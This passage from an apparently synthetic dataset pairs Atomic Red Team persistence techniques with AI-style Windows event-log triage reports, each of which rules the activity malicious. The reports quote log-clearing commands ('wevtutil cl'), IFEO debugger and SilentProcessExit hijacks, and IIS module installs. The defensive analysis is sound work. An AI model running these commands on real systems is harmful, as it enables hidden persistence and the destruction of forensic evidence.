Given the deliberate clearing of logs to potentially hide actions, along with suspicious command execution modifying critical registry areas, this indicates an intentional compromise of security on the system. This activity warrants immediate incident response actions.

### Recommendations:

- **Immediate Actions**:
  - Isolate the affected system to prevent further lateral movement within the network.
  - Conduct a full forensic analysis of the system to understand the extent of the compromise.
  - Review user accounts, particularly `admin_test`, and reset passwords or disable accounts suspected of being compromised.
  - Restore cleared logs from backups if available to trace initial malicious entry points.
  - Strengthen monitoring to detect similar activities in other systems.

- **Long-term Actions**:
  - Educate users about security best practices and signs of suspicious activities.
  - Implement restrictive user privileges, ensuring only authorized users have access to critical tools and elevated privileges.
  - Review and tighten security configurations on PowerShell and command-line utilities to prevent misuse."
GlobalFlags in Image File Execution Options,"**Analysis of Logs:**

**Suspicious and Anomalous Behavior:**

1. **Log Clearance Events:**
   - Multiple event logs, including System, Windows PowerShell, and Security logs, were cleared by the user ""admin_test"". This behavior is often associated with malicious actors attempting to cover their tracks.

2. **PowerShell Execution:**
   - A PowerShell script was executed that modified registry keys under `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\whoami.exe`. It also configured 'SilentProcessExit' for `whoami.exe`, triggering `cmd.exe /c calc.exe` upon execution. This is indicative of a persistence mechanism or obfuscation attempt, a common tactic in malicious behavior.

3. **Use of WevtUtil:**
   - Execution of `wevtutil.exe` to clear log channels such as Microsoft-Windows-Sysmon/Operational is recorded. `wevtutil` is commonly used by attackers to erase event logs and is suspicious, especially when associated with log clearance event ID 1102.

4. **Process Execution Context:**
   - Several commands such as `whoami.exe` and `hostname.exe` were executed frequently, which might indicate reconnaissance efforts. Additionally, these standard commands are often used to test and verify successful privilege escalation or lateral movement.

5. **Edge Update Activities:**
   - Numerous Edge update processes recorded. Although these may appear benign as part of regular software updates, their timing coinciding with suspicious activities like log clearance merits attention.

**Potential Indicators of Malicious Activity:**
- The clearing of event logs in quick succession under a privileged account suggests deliberate obfuscation of activities.
- The manipulation of registry settings related to process execution indicates attempts to alter system behavior in a potentially malicious way.
- Usage of PowerShell with suspicious commands, specifically targeting execution options for `whoami.exe`, suggests alteration for unintended operations.

**Assessment and Threat Identification:**
The sequence of log entries and activities captured within these logs heavily lean toward abnormal and indicative of potential malicious activities:
- The pattern of behavior aligns with those employed by adversaries to establish persistence, conduct reconnaissance, and cover tracks, especially in high-stake environments such as those involving executives (e.g., CTO, CEO devices).

**Guidance and Resolution:**
Given the evidence and the tactics involving log clearance and registry manipulation:
- **Resolution: MALICIOUS**

**Next Steps:**
1. **Isolate the Affected System:** Immediately isolate this computer from the network to prevent further spread or data exfiltration.
2. **Conduct Full Forensic Analysis:** A deep forensic investigation should be launched to understand the full scope of compromise and to identify any additional persistence mechanisms or data accessed.
3. **Review Access and Privileges:** Review and restrict privileges for 'admin_test' and any other accounts showing similar behavior.
4. **Restore Logs and Audit:** Attempt to restore cleared logs, if possible, and increase auditing to detect similar behaviors elsewhere in the network.
5. **Update Security Measures:** Implement patches, update antivirus/malware detection systems, and review other protective measures.
6. **Prepare for Incident Response:** Be ready with an incident response plan for potential findings and further indications of breach within the organization."
Office Application Startup Test Persistence (HKCU),"Based on the analysis of the provided logs, the following observations and evaluation are made:

### Analysis:

1. **PowerShell Activity**:
   - The PowerShell logs indicate that a PowerShell script was executed with a suspicious command involving the creation of a COM object associated with Microsoft Word, and an attempt to add a registry key under `HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf`. The script further involves interactions with DLLs (`officetest_x64.dll` and `officetest_x86.dll`) located in `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1137.002\bin\`.
   - The use of temporary directories and registry modifications is often characteristic of tactics used in attack simulations or malicious activities.

2. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` are run to clear Windows event logs (`Security`, `System`, `Windows PowerShell`), which is highly suspicious as attackers often do this to cover their tracks.
   - The execution of commands such as `whoami.exe`, `hostname.exe`, and `PowerShell.exe` in the context of `SERVER002\admin_test` suggests possible attempts to gather information about the system and user context.

3. **Event Logs Clearing**:
   - The System, Security, and Windows PowerShell logs were cleared shortly after the PowerShell script execution. This action is often indicative of an attempt at log evasion following potentially malicious activities.

4. **Event Security Logs**:
   - Clearing of security logs (Event ID 1102) is present, indicating that the user `admin_test` initiated the log clearing action, which is usually suspicious in an investigation context.

5. **Contextual Indicators**:
   - The `admin_test` user account appears to have high privilege access and was involved in these activities. The clearing of logs by this user adds to the suspicious nature of their actions.

### Assessment:
The combination of suspicious PowerShell activities (modifications of registry keys and DLL interactions), followed immediately by clearing of event logs, and the execution of system reconnaissance commands form a pattern that is indicative of potential malicious activity.

### Recommendations:
- **Immediate Investigation**: Further investigation is needed into the user `admin_test` and the context surrounding their activities.
- **System Review**: Thoroughly review the system for signs of compromise, including unauthorized changes in the file system or configuration settings.
- **Forensic Analysis**: Perform a deeper forensic analysis on the system to look for other indicators of compromise and potential lateral movement in the network.
- **Security Policies**: Implement stricter monitoring and logging policies to prevent log tampering and improve incident detection.

### Resolution:
**MALICIOUS** - The logs contain activity highly indicative of malicious actions, including potential tampering or evasion techniques. Immediate action is required to mitigate potential threats."
Install IIS Module using AppCmd.exe,"Upon analysis of the provided Windows event logs, several events merit attention, indicating potentially malicious activity:

1. **Event Log Clearing**: The logs show sequential clearing of security, system, and PowerShell event logs by the user `admin_test`. Specifically, the commands `wevtutil.exe cl <LogName>` were used to clear these logs, and this action was executed at a high integrity level, suggesting it was done with administrative privileges. Clearing logs is often a tactic used by attackers to cover their tracks after compromising a system, making this behavior highly suspicious.

2. **Use of `cmd.exe` with an Unusual Command**: One entry shows the execution of `cmd.exe` using a command to install a module (`appcmd.exe install module /name:DefaultDocumentModule_Atomic`). This seems unusual in a standard operational context, as there's no typical administrative or system maintenance reason to execute such a command through the command prompt in this form.

3. **Frequent Execution of Administrative Utilities**: The logs reveal multiple executions of `wevtutil.exe` and associated console hosts (`conhost.exe`), indicative of active administration, potentially unauthorized, being carried out on the system.

4. **Microsoft Edge Update Activities**: The logs show numerous entries related to Microsoft Edge Update processes. While such activities can be legitimate if the application is being updated, the frequency and timing in close proximity to other suspicious activities should be further scrutinized to rule out any abuse, such as potentially using legitimate services as a cover for malicious activity.

### Assessment

Based on the above points:

- **Log Clearing** stands out as a significant indicator of potentially malicious activity.
- The execution of seemingly benign administrative operations in an unusual manner suggests possible misuse of administrative privileges, aligning with potential Indicators of Compromise (IoCs).

### Resolution

Given the clearing of event logs, the resolution should be classified as **MALICIOUS**, based on the intent to cover tracks, which is a strong indication of compromise. 

### Recommendations

1. **Immediate Mitigation**: Isolate the affected system from the network to prevent further potential malicious activity or exfiltration of data.
2. **Forensic Analysis**: Conduct a detailed forensic investigation on the isolated system to identify the methods of entry, the presence of any backdoors, and any data that might have been compromised.
3. **User Audit**: Review user account actions and permissions, especially for `admin_test`, to ensure no unauthorized access persists.
4. **Patch Management**: Ensure that the system and applications, especially Microsoft Edge, are up-to-date to prevent exploitation of any known vulnerabilities.
5. **Monitoring and Review**: Increase monitoring on similar systems for any signs of lateral movement and advise end-users about security best practices."
Attaches Command Prompt as a Debugger to a List of Target Processes,"Upon reviewing the provided Windows event logs, there are several indicators of potentially malicious or suspicious behavior:

### Analysis:

1. **Security Log:**
   - **Event ID 1102 (Log File Clearing):** The security log was cleared by the user `admin_test`. This action can be an indicator of an attempt to cover tracks post-compromise.
   - **Event ID 4624 (Logon):** A logon occurred at `13:47:13` with `LogonType 5`, which denotes a service logon. This is typical for services like svchost.exe, but given the context of other events, it must be scrutinized.
   - **Event ID 4672 (Privileges Assigned):** The user `SYSTEM` was assigned high privileges, which is not unusual but requires context verification due to surrounding suspicious activities.

2. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe` being executed to clear event logs, as showcased by command: `""wevtutil.exe cl [log_name]""`. This behavior is typically used to hide traces of activities.
   - The presence of a PowerShell command that alters Windows Image File Execution Options (IFEO) to redirect commonly misused accessibility tools like `osk.exe` to `cmd.exe`. This is indicative of an attempt to create a backdoor or enable elevated command prompt access through ease of access tools, which is a known persistence mechanism.
   - The **integrity level** `High` for many processes under `admin_test` and usage of scripting languages like PowerShell pose further risk.

3. **PowerShell Log:**
   - A PowerShell script was used to modify the registry to implement the IFEO-based persistence mechanisms. This approach is commonly leveraged by malware to maintain access to a system.

4. **Application and System Logs:**
   - The consistent states of Windows Defender being active are standard and not indicative of compromise. 
   - However, repeated clearing of event logs (e.g., with Event ID 104), including the System and Windows PowerShell logs further reinforces the intention of concealment of actions.

### Assessment:

The event logs exhibit clear signs of unauthorized and potentially malicious activities. The behaviors point towards a compromised environment attempting to maintain persistence while concealing its traces.

### Conclusion:

**Resolution: MALICIOUS**

There is compelling evidence in these logs of malicious intent and actions taken towards maintaining unauthorized access and concealing evidence. The combination of log clearing, privilege escalation, and registry modifications to create persistence using standard Windows components signal a likely compromise.

### Recommendations:

- **Immediate Isolation:** Isolate the affected host to prevent further spread or data exfiltration.
- **Detailed Forensic Analysis:** Conduct a thorough investigation to determine if there's further infiltration or exfiltration.
- **Password Changes:** Re-initiate password changes for all accounts, especially those with administrative privileges.
- **Incident Response:** Engage the incident response team to handle containment, eradication, and recovery procedures.
- **Patch & Update:** Ensure all systems are patched with the latest security updates.
- **Review and Strengthen Security Policies:** Evaluate security protocols and improve monitoring to detect similar activities in the future."
Azure AD - Create a new user,"**Analysis:**

1. **Log Clearing Activity (System and Security Log)**
   - **System Log EventID 104** and **Security Log EventID 1102**: Both indicate that the event logs were cleared by the user `admin_test`. This is often a tactic to hide traces of malicious activity. The execution of `wevtutil.exe` with the command-line argument `cl` strongly suggests this action was intentional to clear logs.

2. **Dangerous Command Execution (PowerShell Log and Sysmon Log)**
   - **PowerShell Activity**: The PowerShell session started executing a script that includes `Connect-AzureAD` and creation of a new Azure AD user with potentially significant credentials (`atomicredteam@yourdomain.com`). This is consistent with a known tactic of creating backdoor accounts.
   - **Sysmon Log EventID 1 for PowerShell.exe**: Corroborates the PowerShell execution for suspicious account creation, which is unusual and risky especially if executed without proper oversight or reason. Command lines involving sensitive information like passwords are suspicious and need attention.

3. **Suspicious Privilege Use (Security Log)**
   - **Security Log EventID 4672**: Corresponds to special privilege assignments for the `SYSTEM` account, which while typical in certain legitimate administrative tasks, alongside other suspicious activities signals potential privilege abuse.

4. **Routine System Processes (Sysmon Log)**
   - **Routine Processes**: Numerous logged processes such as `svchost.exe`, `conhost.exe`, and Windows Update related tasks. Under normal circumstances, these are routine. However, in the context of log clearing and PowerShell misuse, even these should be scrutinized for unusual parent-child relationships or other anomalies.

**Assessment:**

Based on the above logs and their context, there are clear indicators of potentially malicious activity:

- **Log clears** are nearly always a sign of someone trying to cover tracks, a big red flag.
- The execution of PowerShell commands to create potentially unauthorized Azure AD users particularly with high privileges is a strong indicator of malicious intentions.
- The environment and timing surrounding these events, especially on a high-profile user's machine like the CEO's, heighten the risk and threat level.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

- **Immediate Action**: Isolate the affected machine (CEO's machine) from the network to prevent further unauthorized access or data exfiltration.
- **Investigate User Accounts**: Quickly review Azure AD accounts for suspicious user creation and disable any accounts or privileges that are inappropriate or unexpected.
- **Audit Log Policies**: Ensure logging policies are preventing unauthorized log clearing and retaining sufficient historical data for security analysis.
- **Conduct a Full Forensic Investigation**: Perform a thorough forensic analysis to uncover the full extent of the intrusion, identify the initial vector, and any other possible impacted systems or data.
- **Incident Response Plan**: Initiate the company's incident response plan, informing relevant internal teams and external contacts as needed (e.g., legal, cybersecurity consultants).

Ensure more robust monitoring is in place going forward, focusing both on behavioral elements (such as unexpected admin-like activity from standard user accounts) and on the implementation of more sophisticated detection mechanisms for suspicious chains of activity (e.g., automatic alerts on `wevtutil` and PowerShell command patterns)."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"Upon reviewing the provided Windows event logs, there are several points of concern that warrant further investigation:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs**:
   - Event ID 104 in the System log and Event ID 1102 in the Security log show that logs were cleared by a user named `admin_test`. The clearing of Windows event logs, especially Security, System, and PowerShell logs, can be an indicator of an attempt to cover tracks.

2. **Unusual PowerShell Activity**:
   - The Sysmon log shows PowerShell executable execution by the user `admin_test`, with a suspicious command line involving copying a `.ppam` file to the Microsoft Office Add-ins path, setting registry keys for autoloading, and attempting to start `PowerPnt` (PowerPoint). This activity seems to mimic behavior commonly associated with a known technique in the Atomic Red Team arsenal (T1137.006) used for persistence via Office add-ins.
   - The PowerShell logs further corroborate this activity, showing the execution of potentially malicious PowerShell commands.

3. **Usage of WEVTUTIL**:
   - Multiple instances of `wevtutil.exe` were executed to clear logs from the Sysmon, Application, and Security logs, which aligns with suspicious behavior associated with log tampering.

### Indicators of Potential Malicious Activity:

- **Persistence Mechanism**:
  - The series of PowerShell commands implies an attempt to establish persistence through misuse of Microsoft Office add-ins—a technique often employed to maintain a foothold in a compromised system.

- **Event Log Clearing**:
  - The deliberate clearing of event logs is typically indicative of malicious intent, aiming to erase traces of intrusion or unauthorized changes to the system.

### Assessment of the Situation:

The logs showcase behavior that strongly suggests malicious activity. The combination of cleared event logs, specific PowerShell commands aimed at altering registry settings and leveraging Office for persistence, and the consistent user ID (`admin_test`) associated with these activities points to a compromise.

### Threats or Risks Identified:

- **Data Exfiltration or System Manipulation**:
  - The PowerShell script execution poses a risk of unauthorized data access or modification.
- **Covering of Tracks**:
  - Log clearing suggests an attempt to hide potentially damaging actions or compromise evidence from administrators or incident responders.

### Guidance on How to Proceed:

1. **Resolution**: **MALICIOUS**
   - Immediate containment measures should be enacted, including isolating the affected host (Server002) from the network.
2. **Forensic Analysis**:
   - Conduct a thorough forensic analysis to determine the full scope of compromise, focusing on tracing actions taken by `admin_test`.
3. **Review Access Logs**:
   - Examine access controls and login attempts associated with the `admin_test` account to ascertain possible credential misuse or compromise.
4. **Enhance Monitoring**:
   - Implement enhanced monitoring to detect similar suspicious activities, especially focusing on PowerShell usage and log manipulation.
5. **Communication and Notification**:
   - Inform relevant stakeholders, including IT and security teams, to ensure awareness and coordination of containment efforts.

The systematic clearing of logs, alongside suspicious command executions, matches well-documented malicious techniques aimed at persisting and obfuscating unauthorized activities in a compromised environment."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"### Analysis of Windows Event Logs

Upon examining the provided logs from different sources (PowerShell, Application, Security, Sysmon, and System logs), several key indicators suggest potential malicious activity:

#### PowerShell Logs:
- Consistent execution of PowerShell scripts involving `New-WebGlobalModule`. The command line: `""powershell.exe & {New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\system32\inetsrv\defdoc.dll}""` depicts a possible attempt to create or manipulate an IIS (Internet Information Services) module. This can be used to backdoor or modify web server behavior. Such activity requires elevated privileges and is atypical for legitimate administrative tasks.

#### Security Log:
- Event ID 1102 in the Security log indicates the audit logs have been cleared. This action is often associated with an attempt to cover tracks following malicious activity. The user associated is ""admin_test,"" suggesting misuse of a privileged account.

#### Sysmon Logs:
- Multiple instances of `wevtutil.exe` being executed with the command `cl <LogName>` suggest the clearing of logs in the Windows Event Viewer channels, including Security, System, and PowerShell logs. This supports the finding that logs were cleared intentionally to remove traces of past activities.
  
- The execution of `whoami.exe`, `hostname.exe`, and `powershell.exe` by the same account (SERVER002\admin_test) indicates reconnaissance commands which are typically used by an attacker to gather information about user privileges and the system environment.
  
#### System Log:
- Log entries with Event ID 104 indicate the clearing of various logs like System and Windows PowerShell logs. Again, this aligns with attempts to erase tracks from the system.
  
### Threats and Risks Identified:
1. **Unauthorized PowerShell Activity**: The command used to manipulate a global module is suspicious and may reflect an attack on web server components.
2. **Audit Log Clearing**: Both security and system logs show evidence of being cleared, an action usually performed by attackers post-exploitation to cover their footprints.
3. **Reconnaissance Commands**: The presence of commands such as `hostname.exe` and `whoami.exe`, while not inherently harmful, in this context suggests they're part of malicious reconnaissance by a user leveraging a high-level account.

### Guidance and Resolution:
Given the identified activities—execution of dubious PowerShell scripts, clearing of audit logs, and the engagement of reconnaissance utilities—the situation leans heavily towards malicious activities directed by potentially compromised administrative credentials.

**Resolution: MALICIOUS**

### Recommended Actions:
1. **Immediate Account Investigation**: Investigate the account ""admin_test"" for any potential compromise or misuse. Ensure the credentials are secured, possibly by changing passwords and reviewing access logs.
2. **Incident Response Activation**: Engage incident response protocols to contain and remediate any unauthorized changes or implants in the web server environment.
3. **System Security Audit**: Conduct a full security audit of the server and connected systems to identify any further indicators of compromise or subsequent malicious activities.
4. **Reinforce Security Measures**: Implement additional monitoring, particularly around PowerShell activity and log integrity, to prevent similar occurrences."
